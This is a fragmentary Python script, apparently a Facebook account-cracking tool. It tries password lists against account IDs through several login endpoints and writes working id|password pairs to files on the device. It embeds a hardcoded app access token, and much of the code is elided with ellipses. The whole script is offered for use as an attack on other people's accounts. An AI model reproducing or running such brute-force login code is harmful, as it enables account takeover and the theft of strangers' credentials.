...
os.system('xdg-open https://www.facebook.com/naqi.king.355')
...
logo=("""\033[1;91m
          ...
          \033[1;97m| $$\  $$$| $$  | $$| $$/$$ $$  | $$
          \033[1;97m| $$ \  $$| $$  | $$|  $$$$$$/ /$$$$$$
          \033[1;97m|__/  \__/|__/  |__/ \____ $$$|______/[1;32m  NAIMAT
          \033[1;97m                          \__/
\033[1;37m--------------------------------------------------
[~] Author   : M Naqî Hassañ
[~] Facebook : M Naqî Hassañ
[~] Tool     : Private
[~] Version  : 0.1
\033[1;37m----------------------------------------------""")
def linex():
...
def menu():
		...
		#	linex()
			...
			if xd in ['1','01']:
				...
				os.system('xdg-open https://wa.me/+923424370359?text=')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [NAQI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [NAQI-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/NAQI-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [NAQI-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/NAQI-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/NAQI-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [NAQI-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[NAQI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NAQI-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NAQI-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [NAQI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/NAQI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in TRT:
				...
				print('\r\r\033[1;32m [NAQI-OK] %s | %s'%(ids,pas))
				open('/sdcard/NAQI-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [NAQI-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [NAQI-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [NAQI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [NAQI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [NAQI-OK] '+udx+' | '+pas+'\033[1;97m')
...
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [NAQI-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [NAQI-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [NAQI-OK] '+uid+' | '+pas)
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [NAQI-CP] '+uid+' | '+pas+'\033[1;97m')
